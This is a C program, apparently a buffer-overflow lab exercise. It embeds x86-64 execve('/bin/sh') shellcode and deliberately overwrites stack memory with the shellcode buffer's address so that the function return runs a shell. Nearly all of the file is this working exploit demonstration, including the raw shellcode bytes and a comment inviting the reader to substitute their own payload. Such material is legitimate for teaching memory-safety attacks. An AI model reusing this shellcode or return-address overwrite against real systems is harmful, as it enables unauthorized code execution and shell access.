#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long long *hold;
int i,j;
//char shellcode[] ="\x90\x90\x90\x90\x90\x90\x90\x90"
//  "\x90\x90\x90\x90\x90\x90\x90\x90";
//Replace the above NOP shell code with your shell code.

char shellcode[]="\xeb\x0b\x5f\x31\xf6\x31\xd2\x67\x8d\x42\x3b\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
//char shellcode[]="\xeb\x09\x5f\x31\xf6\x31\xd2\xb0\x3b\x0f\x05\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";


unsigned long long get_sp(void) { 
  __asm__("movl %esp,%eax"); 
} 

void dumb(char *arg)
{
  long long *test;
  hold=(unsigned long long *)&test;
  char filename[1024];   //Buffer to hold filename.
  printf("\nValue of Test:%llx",(unsigned long long )&test);
  printf("\nValue of filename[0]:%llx\n",(unsigned long long )filename);
  printf("The attack buffer is going to need to be a little bit bigger than:%llx",((unsigned long long)test-(unsigned long long)filename));
 
  strcpy (filename, shellcode);
  
  for (i=0;i<5;i++)
   {
     *hold=filename;
     hold=hold+1;
   }
  
  return;
}

int main(int argc, char* argv[])
{
  char holding[10000];
  char *string;
  string=argv[1];
  unsigned long long stack; 
  stack=get_sp();
  
    if(argc>1)                //Make sure that a filename was provided.
    {
      printf("\\Length of Input String:%d\\", strlen(string));
      dumb(argv[1]);   
    }
    else
      {
	printf("\n\nError: No Command Line arg for vuln was given\n\n");
	dumb("Useless Text");
      }
  return (0);
}
